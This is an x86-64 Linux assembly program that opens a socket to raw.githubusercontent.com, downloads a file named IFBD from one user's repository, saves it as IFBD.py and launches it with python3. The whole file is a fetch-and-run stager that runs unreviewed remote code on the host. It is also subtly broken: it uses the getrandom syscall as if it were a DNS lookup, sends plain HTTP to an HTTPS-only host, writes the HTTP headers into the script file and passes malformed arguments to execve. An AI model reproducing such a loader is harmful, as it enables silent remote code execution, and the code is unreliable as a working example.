section .data
    domain db "raw.githubusercontent.com", 0
    port dw 0x5000
    http_request db "GET /MUHIB-143/IFBD/main/IFBD HTTP/1.1", 13, 10
                 db "Host: raw.githubusercontent.com", 13, 10
                 db "Connection: close", 13, 10, 13, 10
    request_len equ $ - http_request
    script_path db "IFBD.py", 0
    python_cmd db "/usr/bin/python3", 0
    python_arg1 db "python3", 0
    python_arg2 db "IFBD", 0
    python_arg3 db "--verbose", 0
    null dq 0

section .bss
    buffer resb 8192
    ip_buffer resb 16
    file_desc resq 1

section .text
    global _start
    extern execve

resolve_dns:
    mov rax, 318
    mov rdi, domain
    lea rsi, [ip_buffer]
    mov rdx, 16
    syscall
    ret

create_socket:
    mov rax, 41
    mov rdi, 2
    mov rsi, 1
    xor rdx, rdx
    syscall
    mov rdi, rax
    mov [file_desc], rax
    ret

connect_to_server:
    mov rsi, rsp
    mov word [rsi], 2
    mov word [rsi+2], 0x5000
    mov rax, [ip_buffer]
    mov [rsi+4], rax
    mov rdx, 16
    mov rax, 42
    syscall
    ret

send_request:
    mov rsi, http_request
    mov rdx, request_len
    mov rax, 44
    syscall
    ret

receive_response:
    mov rsi, buffer
    mov rdx, 8192
    mov rax, 45
    syscall
    ret

parse_response:
    mov rsi, buffer
    mov rcx, 8192
parse_loop:
    cmp byte [rsi], 10
    je script_start
    inc rsi
    loop parse_loop
script_start:
    inc rsi
    mov rdi, rsi
    ret

write_script:
    mov rdi, script_path
    mov rsi, 0x42
    mov rdx, 0644
    mov rax, 2
    syscall
    mov rdi, rax
    mov rsi, buffer
    mov rdx, 8192
    mov rax, 1
    syscall
    ret

execute_script:
    mov rdi, python_cmd
    lea rsi, [python_arg1]
    lea rdx, [python_arg2]
    lea rcx, [python_arg3]
    lea r8, [null]
    mov rax, 59
    syscall
    ret

_start:
    call resolve_dns
    call create_socket
    call connect_to_server
    call send_request
    call receive_response
    call parse_response
    call write_script
    call execute_script

    mov rax, 60
    xor rdi, rdi
    syscall
